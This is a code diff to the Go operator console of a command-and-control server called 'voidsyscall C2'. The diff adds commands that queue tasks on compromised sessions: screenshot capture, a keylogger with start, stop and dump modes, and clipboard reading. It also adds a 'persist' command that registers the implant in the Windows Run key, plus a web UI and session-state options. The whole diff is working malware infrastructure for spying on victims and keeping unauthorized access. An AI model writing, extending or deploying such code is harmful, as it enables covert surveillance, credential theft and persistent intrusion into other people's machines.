@@ -12,6 +12,8 @@ import (
 	"github.com/VoidSecSoftwares/voidsyscall/server"
 )
 
+var version = "dev"
+
 func parseSessionID(s string) ([16]byte, bool) {
 	var id [16]byte
 	decoded, err := hex.DecodeString(s)
@@ -59,6 +61,11 @@ func printHelp() {
 	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "ps <id>", server.AnsiReset, "List processes on a session")
 	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "killproc <id> <pid>", server.AnsiReset, "Terminate a process by PID")
 	fmt.Println()
+	fmt.Printf("%s%ssurveillance%s\n", server.AnsiBold, server.AnsiCyan, server.AnsiReset)
+	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "shot <id>", server.AnsiReset, "Capture a screenshot to screenshots/<task>.bmp")
+	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "keylog <id> <1|2|3>", server.AnsiReset, "Keylogger: 1=start, 2=stop, 3=dump")
+	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "clipboard <id>", server.AnsiReset, "Read the clipboard unicode text")
+	fmt.Println()
 	fmt.Printf("%s%sPivoting / files%s\n", server.AnsiBold, server.AnsiCyan, server.AnsiReset)
 	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "download <id> <remote> <local>", server.AnsiReset, "Pull a file off a session")
 	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "upload <id> <local> <remote>", server.AnsiReset, "Push a file to a session")
@@ -75,6 +82,7 @@ func printHelp() {
 	fmt.Printf("%s%sPersistence%s\n", server.AnsiBold, server.AnsiCyan, server.AnsiReset)
 	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "schedule <id> <sec> <command>", server.AnsiReset, "Recurring shell task on a session")
 	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "unschedule <id>", server.AnsiReset, "Clear all schedules")
+	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "persist <id> [name]", server.AnsiReset, "Register agent in the Run key")
 	fmt.Println()
 	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "help", server.AnsiReset, "Show this help")
 	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "exit | quit", server.AnsiReset, "Shut down the server")
@@ -92,6 +100,8 @@ func main() {
 	beaconPath := flag.String("path", "/api/v2/health", "Beacon endpoint path")
 	certFile := flag.String("cert", "", "TLS certificate file")
 	keyFile := flag.String("key", "", "TLS key file")
+	webAddr := flag.String("web-addr", "", "Operator web UI listen address (empty = disabled)")
+	stateFile := flag.String("state", "", "JSON state file for session persistence across restarts")
 	flag.Parse()
 
 	cfg := &server.ServerConfig{
@@ -105,6 +115,8 @@ func main() {
 		BeaconPath: *beaconPath,
 		CertFile:   *certFile,
 		KeyFile:    *keyFile,
+		WebAddr:    *webAddr,
+		StateFile:  *stateFile,
 	}
 
 	if *certFile == "" || *keyFile == "" {
@@ -115,7 +127,7 @@ func main() {
 	srv := server.NewServer(cfg)
 
 	fmt.Printf("%s%s%s\n", server.AnsiCyan, "╔══════════════════════════════════════════╗", server.AnsiReset)
-	fmt.Printf("%s%s%s\n", server.AnsiCyan, "║       voidsyscall C2 — v1.0.0            ║", server.AnsiReset)
+	fmt.Printf("%s%s%s\n", server.AnsiCyan, bannerVersionLine(version), server.AnsiReset)
 	fmt.Printf("%s%s%s\n", server.AnsiGreen, "║  VoidSec Softwares                       ║", server.AnsiReset)
 	fmt.Printf("%s%s%s\n", server.AnsiGreen, "║  HTTPS / DNS / ICMP / DoH                ║", server.AnsiReset)
 	fmt.Printf("%s%s%s\n", server.AnsiCyan, "╚══════════════════════════════════════════╝", server.AnsiReset)
@@ -416,6 +428,73 @@ func main() {
 					fmt.Printf("%sTerminate task queued for PID %d%s\n", server.AnsiGreen, pid, server.AnsiReset)
 				}
 
+			case "shot":
+				sid, ok := parseSessionID(args)
+				if !ok {
+					fmt.Printf("%sUsage:%s shot <session-hex>\n", server.AnsiYellow, server.AnsiReset)
+					continue
+				}
+				if err := srv.RunScreenshot(sid); err != nil {
+					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
+				} else {
+					fmt.Printf("%sScreenshot task queued%s\n", server.AnsiGreen, server.AnsiReset)
+				}
+
+			case "keylog":
+				parts2 := strings.SplitN(args, " ", 2)
+				if len(parts2) < 2 {
+					fmt.Printf("%sUsage:%s keylog <session-hex> <1|2|3>\n", server.AnsiYellow, server.AnsiReset)
+					continue
+				}
+				sid, ok := parseSessionID(parts2[0])
+				if !ok {
+					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
+					continue
+				}
+				sub, ok := parseSmallByte(parts2[1])
+				if !ok || sub < 1 || sub > 3 {
+					fmt.Printf("%sSub-command must be 1-3%s\n", server.AnsiYellow, server.AnsiReset)
+					continue
+				}
+				if err := srv.RunKeylog(sid, sub); err != nil {
+					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
+				} else {
+					fmt.Printf("%sKeylog task queued%s\n", server.AnsiGreen, server.AnsiReset)
+				}
+
+			case "clipboard":
+				sid, ok := parseSessionID(args)
+				if !ok {
+					fmt.Printf("%sUsage:%s clipboard <session-hex>\n", server.AnsiYellow, server.AnsiReset)
+					continue
+				}
+				if err := srv.RunClipboard(sid); err != nil {
+					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
+				} else {
+					fmt.Printf("%sClipboard task queued%s\n", server.AnsiGreen, server.AnsiReset)
+				}
+
+			case "persist":
+				parts2 := strings.SplitN(args, " ", 2)
+				if len(parts2) < 1 {
+					fmt.Printf("%sUsage:%s persist <session-hex> [value-name]\n", server.AnsiYellow, server.AnsiReset)
+					continue
+				}
+				sid, ok := parseSessionID(parts2[0])
+				if !ok {
+					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
+					continue
+				}
+				valueName := ""
+				if len(parts2) > 1 {
+					valueName = parts2[1]
+				}
+				if err := srv.RunPersist(sid, valueName); err != nil {
+					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
+				} else {
+					fmt.Printf("%sPersist task queued%s\n", server.AnsiGreen, server.AnsiReset)
+				}
+
 			case "kill":
 				sid, ok := parseSessionID(args)
 				if !ok {
@@ -522,4 +601,17 @@ func parseSmallByte(s string) (byte, bool) {
 		return 0, false
 	}
 	return byte(n), true
+}
+
+// bannerVersionLine produces the second line of the boxed banner, padded so
+// the right wall aligns with the rest of the box regardless of version length.
+func bannerVersionLine(ver string) string {
+	const interior = 42
+	prefix := "       voidsyscall C2 — "
+	content := prefix + ver
+	pad := interior - len(content)
+	if pad < 1 {
+		pad = 1
+	}
+	return "║" + content + strings.Repeat(" ", pad) + "║"
 }
